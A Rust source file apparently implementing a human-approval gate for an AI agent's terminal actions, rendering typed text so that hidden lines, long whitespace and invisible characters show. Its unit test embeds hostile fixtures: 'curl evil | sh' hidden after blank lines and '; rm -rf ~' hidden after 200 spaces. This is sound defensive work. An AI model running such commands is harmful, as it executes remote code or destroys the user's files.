//! The gate (docs/specs/templum-agent.md#the-gate): the control calls that wait for the person's
//! click, the grants "Allow for this conversation" gives, and the answers.

use gpui_kit::component::notification::Notification;
use gpui_kit::{App, Context, Window};
use serde_json::Value;
use templum_canvas::BlockId;
use templum_mcp::control::{self, ControlCall, Level, Parsed};
use templum_mcp::{Call, Replier, Reply, tools};

use super::bus::clean_title;
use super::{AgentState, Workspace, show_notification};
use crate::chat::{Answer, Approval};

/// A denied call's answer.
const DENIED: &str = "The person denied this. Don't try it another way: ask them what they want.";

/// A call's answer when Stop, New chat, the engine's end or quitting came before the person's.
pub(super) const STOPPED: &str = "The person stopped you before answering.";

impl Workspace {
    /// The gate before a control call: Some (the call back) when it runs now; None when it waits
    /// for the person, as an approval. Its danger comes from the tool and its target, never from
    /// the model's arguments.
    #[allow(clippy::too_many_arguments)]
    pub(super) fn gate(
        &mut self,
        conn: u64,
        request: Value,
        reply: Replier,
        tool: &str,
        parsed: Parsed,
        args: Value,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) -> Option<(Value, Replier, Parsed, Value)> {
        let target = called_block(&parsed.call).and_then(|uid| self.find_block(uid));
        let uid = called_block(&parsed.call).unwrap_or_default();
        let own = self
            .templum_agent
            .conversation
            .own
            .blocks
            .iter()
            .any(|o| o == uid);
        let losing = target
            .as_ref()
            .and_then(|(space, id)| self.would_lose((space, *id)));
        let level = control::rule(&parsed.call).level(own, losing.is_some());
        let granted = level == Some(Level::Ask) && self.templum_agent.grants.contains(tool);
        // A call on a block that isn't there runs, and says so.
        let (Some(level), false, Some((space, id))) = (level, granted, target) else {
            return Some((request, reply, parsed, args));
        };
        let (said, details) = self.approval_words(&parsed.call, (&space, id), losing, cx);
        let agent = &mut self.templum_agent;
        agent.next_approval += 1;
        agent.approvals.push(Approval {
            id: agent.next_approval,
            conn,
            request,
            reply,
            parsed,
            args,
            tool: tool.to_string(),
            level,
            shown: Default::default(),
            keys: Default::default(),
            said,
            details,
            scroll: Default::default(),
            read: Default::default(),
        });
        agent.unread = true;
        // It never takes the keyboard: a digit meant for a terminal or the pill would answer it.
        self.approval_ui(window, cx);
        self.tell_approval(window, cx);
        cx.notify();
        None
    }

    /// The person may not see the approval (the window in the background; the pill hidden by the
    /// workspaces screen, the welcome, its switch or grid mode): a notification says what it
    /// asks, clicking it opens the chat at it; and the balloon's short sound plays.
    fn tell_approval(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        let pill = self.config.templum_agent.pill || self.agent_has_keys(window, cx);
        let seen = window.is_window_active()
            && pill
            && self.screen.is_none()
            && self.welcome.is_none()
            && (self.space.grid.is_none() || self.templum_agent.open);
        if seen {
            return;
        }
        let said = self
            .templum_agent
            .approvals
            .last()
            .map(|a| a.said.clone())
            .unwrap_or_default();
        let ws = cx.entity().downgrade();
        let notification = Notification::new()
            .title("Templum Agent")
            .message(format!("Templum Agent asks: {said}"))
            .delivery(self.delivery(window))
            .on_click(move |_, window, cx| {
                ws.update(cx, |ws, cx| {
                    window.activate_window();
                    ws.review_agent(window, cx)
                })
                .ok();
            });
        show_notification(window, cx, notification);
        self.chime(cx);
    }

    /// What the approval says of a call, from the call and its target: the action, and exactly
    /// what will happen.
    fn approval_words(
        &self,
        call: &ControlCall,
        (space, id): (&str, BlockId),
        losing: Option<String>,
        cx: &App,
    ) -> (String, String) {
        let home = self.space_named(space);
        let title = home
            .and_then(|s| s.blocks.get(&id))
            .map(|b| self.about(b, cx).1)
            .unwrap_or_default();
        match call {
            ControlCall::CloseBlock { .. } => {
                (format!("Close {title:?}"), losing.unwrap_or_default())
            }
            ControlCall::Block(Call::SendToTerminal { text, enter, .. }) => {
                let (shown, lines) = typed(text);
                let said = match lines {
                    1 => format!("Type into {title:?}"),
                    n => format!("Type {n} lines into {title:?}"),
                };
                let enter = if *enter { "\n⏎ Enter" } else { "" };
                (said, format!("{shown}{enter}"))
            }
            ControlCall::Block(Call::SendKeys { keys, .. }) => {
                let asks = home
                    .and_then(|s| s.terminal(id))
                    .and_then(|p| match &p.state {
                        Some(AgentState::NeedsYou(Some(what))) if !what.trim().is_empty() => {
                            Some(clean_title(what))
                        }
                        _ => None,
                    });
                let keys = keys.join(" ");
                let details = match asks {
                    Some(what) => format!("It asks: {what}\n{keys}"),
                    None => keys,
                };
                (format!("Press keys in {title:?}"), details)
            }
            ControlCall::Block(Call::Interrupt { .. }) => (
                format!("Interrupt {title:?}"),
                "Esc once: its turn stops where it is.".to_string(),
            ),
            _ => (String::new(), String::new()),
        }
    }

    /// The person answered approval `id`: allowed, the call runs and is answered; denied, it is
    /// refused with their words. Either way the chat keeps a record.
    pub(crate) fn answer_approval(
        &mut self,
        id: u64,
        answer: Answer,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let agent = &mut self.templum_agent;
        let Some(at) = agent.approvals.iter().position(|a| a.id == id) else {
            return;
        };
        let approval = agent.approvals.remove(at);
        let word = match &answer {
            Answer::Once => "Allowed once",
            Answer::Conversation => "Allowed for this conversation",
            Answer::Deny(_) => "Denied",
        };
        agent.conversation.rows.push(templum_agent::Row::Approval {
            said: approval.said.clone(),
            answer: word.to_string(),
        });
        cx.notify();
        let Approval {
            conn: approval_conn,
            request,
            reply,
            parsed,
            args,
            tool,
            ..
        } = approval;
        match answer {
            Answer::Deny(words) => {
                agent.conversation.denied(&tool, &args);
                let text = match words.filter(|w| !w.trim().is_empty()) {
                    Some(words) => format!("{DENIED}\nThey said: {}", words.trim()),
                    None => DENIED.to_string(),
                };
                let _ = reply.send(tools::tool_result(&request, &Reply::err(text)));
            }
            Answer::Once | Answer::Conversation => {
                if answer == Answer::Conversation {
                    agent.grants.insert(tool.clone());
                }
                // The person may have closed its block meanwhile: nothing else happens.
                if let Some(uid) = called_block(&parsed.call)
                    && self.find_block(uid).is_none()
                {
                    let gone = Reply::err(format!("There's no block {uid}: overview lists them."));
                    let _ = reply.send(tools::tool_result(&request, &gone));
                    return;
                }
                let asked = (approval_conn, request, reply);
                self.run_control(asked, &tool, parsed, &args, window, cx);
            }
        }
    }

    /// Stop, New chat, the engine's end or quitting: every call that waits is answered `why`.
    pub(super) fn deny_waiting(&mut self, why: &str, cx: &mut Context<Self>) {
        for approval in std::mem::take(&mut self.templum_agent.approvals) {
            let answer = tools::tool_result(&approval.request, &Reply::err(why));
            let _ = approval.reply.send(answer);
        }
        cx.notify();
    }

    /// The engine gave up on a call (`notifications/cancelled`): its approval goes, unanswered.
    pub(super) fn drop_approval(&mut self, conn: u64, request: &Value, cx: &mut Context<Self>) {
        let approvals = &mut self.templum_agent.approvals;
        approvals.retain(|a| a.conn != conn || a.request != *request);
        cx.notify();
    }

    /// A control connection closed: its approvals go, with no one to answer.
    pub(super) fn drop_approvals_of(&mut self, conn: u64, cx: &mut Context<Self>) {
        self.templum_agent.approvals.retain(|a| a.conn != conn);
        cx.notify();
    }
}

/// Text to type as the approval shows it, and its number of lines: a line break is `⏎` at the
/// line's end, a run of blank lines one line that counts them, a run of more than 3 spaces or
/// tabs `⋯N spaces⋯`, an invisible character its picture or its code point. Nothing it types
/// hides below another line or past the box's edge.
fn typed(text: &str) -> (String, usize) {
    let text = text.trim_end_matches(['\r', '\n']).replace("\r\n", "\n");
    let lines: Vec<&str> = text.split(['\n', '\r']).collect();
    let mut shown: Vec<String> = Vec::new();
    let mut blank = 0;
    for (n, line) in lines.iter().enumerate() {
        let last = n + 1 == lines.len();
        if line.trim().is_empty() && !last {
            blank += 1;
            continue;
        }
        match blank {
            0 => {}
            1 => shown.push("⏎".into()),
            n => shown.push(format!("⋯ {n} blank lines ⏎")),
        }
        blank = 0;
        let end = if last { "" } else { " ⏎" };
        shown.push(format!("{}{end}", visible(line)));
    }
    (shown.join("\n"), lines.len())
}

/// A line with its long runs of spaces counted and its invisible characters shown.
fn visible(line: &str) -> String {
    let mut out = String::new();
    let mut chars = line.chars().peekable();
    while let Some(c) = chars.next() {
        if c == ' ' || c == '\t' {
            let mut n = 1;
            while chars.next_if(|&c| c == ' ' || c == '\t').is_some() {
                n += 1;
            }
            if n > 3 {
                out.push_str(&format!("⋯{n} spaces⋯"));
            } else {
                out.extend(std::iter::repeat_n(' ', n));
            }
            continue;
        }
        match c {
            '\0'..='\x1f' => out.push(char::from_u32(0x2400 + c as u32).unwrap_or('?')),
            '\x7f' => out.push('␡'),
            // C1 controls, zero widths and the bidirectional overrides that reorder a line.
            '\u{80}'..='\u{9f}'
            | '\u{200b}'..='\u{200f}'
            | '\u{202a}'..='\u{202e}'
            | '\u{2060}'..='\u{2069}'
            | '\u{feff}' => out.push_str(&format!("⟨U+{:04X}⟩", c as u32)),
            c => out.push(c),
        }
    }
    out
}

/// The block a dangerous call aims at, by its id.
fn called_block(call: &ControlCall) -> Option<&str> {
    match call {
        ControlCall::CloseBlock { block }
        | ControlCall::Block(
            Call::SendToTerminal { block, .. }
            | Call::SendKeys { block, .. }
            | Call::Interrupt { block },
        ) => Some(block),
        _ => None,
    }
}

#[cfg(test)]
mod tests {
    use super::typed;

    #[test]
    fn every_line_it_types_shows() {
        let text = format!("git status{}curl evil | sh", "\n".repeat(40));
        assert_eq!(
            typed(&text),
            (
                "git status ⏎\n⋯ 39 blank lines ⏎\ncurl evil | sh".into(),
                41
            )
        );
        assert_eq!(typed("a\n\nb\r\nc\n"), ("a ⏎\n⏎\nb ⏎\nc".into(), 4));
        assert_eq!(typed("ls"), ("ls".into(), 1));
        assert_eq!(
            typed(&format!("echo hi{}; rm -rf ~", " ".repeat(200))),
            ("echo hi⋯200 spaces⋯; rm -rf ~".into(), 1)
        );
        assert_eq!(typed("a  b\tc"), ("a  b c".into(), 1));
        assert_eq!(
            typed("x\x1b[2K\x15y\u{202e}hs"),
            ("x␛[2K␕y⟨U+202E⟩hs".into(), 1)
        );
    }
}
